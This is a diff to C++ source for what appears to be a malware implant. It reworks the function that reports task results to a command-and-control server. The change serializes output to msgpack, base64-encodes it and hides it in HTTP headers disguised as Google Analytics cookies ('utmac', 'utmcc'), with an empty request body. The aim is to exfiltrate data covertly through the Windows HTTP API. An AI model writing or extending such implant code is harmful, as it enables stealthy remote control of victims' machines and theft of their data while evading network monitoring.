@@ -59,19 +59,38 @@ nlohmann::json get(std::string implant_uuid) {
     return nullptr;
 }
 
-int post(std::string implant_uuid, std::string output_data) {
-    std::vector<uint8_t> http_post_response_buffer;
+int post(std::string implant_uuid, std::string output_data, std::string task_uuid) {
+    std::vector<uint8_t> task_response_msgpack;
+
+    //need to turn output data into msgpack
+    create_task_response(implant_uuid, task_uuid, output_data, task_response_msgpack);
 
     //any transformations to data
-    //base64_encode_inplace(implant_uuid); //this should be metadata buffer
+    //hold bytes in string, as all the transforsm want a string
+    std::string payload(task_response_msgpack.begin(), task_response_msgpack.end());
+    base64_encode_inplace(payload); //this should be metadata buffer
 
     //add into header - wstring cuz that's what the winapi uses
     std::vector<std::wstring> headers = {
-    L"utmcc: " + std::wstring(implant_uuid.begin(), implant_uuid.end())
+    L"utmac: " + std::wstring(implant_uuid.begin(), implant_uuid.end()),
+    L"utmcc: " + std::wstring(payload.begin(), payload.end())
+
     };
 
+    //add payload header - wstring cuz that's what the winapi uses
+    //std::vector<std::wstring> payload_stored_in_header = {
+    //L"utmac: " + std::wstring(payload.begin(), payload.end())
+    //};
+
+    //this specific profile, no data in body. It's stored in utmcc
+    std::string payload_string = "";
+
     //send
-    HTTP_POST(output_data, headers, http_post_response_buffer);
+    std::vector<uint8_t> http_post_response_buffer;
+    if (!HTTP_POST(payload_string, headers, http_post_response_buffer)) {
+        std::cout << "Error occured posting data";
+    };
+    
     return 0;
 
 }
